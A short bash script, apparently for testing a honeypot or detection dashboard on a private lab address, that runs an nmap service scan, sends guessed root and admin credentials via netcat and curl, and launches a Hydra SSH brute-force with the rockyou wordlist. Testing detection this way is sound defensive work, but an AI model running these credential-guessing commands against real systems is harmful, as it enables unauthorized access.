#!/bin/bash
TARGET="192.168.100.10"

echo "[1] Running nmap scan..."
nmap -sV -p 2222,8080,2323 $TARGET

echo "[2] Testing SSH connection with netcat..."
echo -e "root\npassword123" | nc -w 3 $TARGET 2222

echo "[3] Testing HTTP login..."
curl -s -X POST http://$TARGET:8080 \
  -d "username=admin&password=admin123"

echo "[4] Running Hydra brute-force (5 attempts)..."
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  -t 4 -e nsr -f \
  ssh://$TARGET:2222

echo "[*] Attack simulation complete. Check dashboard."